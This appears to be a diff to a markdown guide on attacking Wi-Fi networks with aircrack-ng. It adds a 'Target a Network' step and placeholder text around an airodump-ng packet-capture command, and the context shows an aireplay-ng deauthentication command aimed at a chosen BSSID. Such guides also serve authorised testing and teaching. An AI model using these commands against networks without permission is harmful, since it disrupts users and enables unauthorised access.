@@ -97,9 +97,12 @@ airodump-ng wlan0
 ```
 This will display available Wi-Fi networks.
 
+#### 3. Target a Network
+   Identify the target network (ESSID and BSSID) and capture its packets:
 ```bash
-airodump-ng -c [channel] --bssid [BSSID] -w  capture wlan0
+airodump-ng -c [channel] --bssid [BSSID] -w  [filename] wlan0
 ```
+Replace `[channel]`, `[BSSID]`, and `[filename]` with the appropriate values.
 
 ```bash
 aireplay-ng --deauth 10 -a [BSSID] wlan0
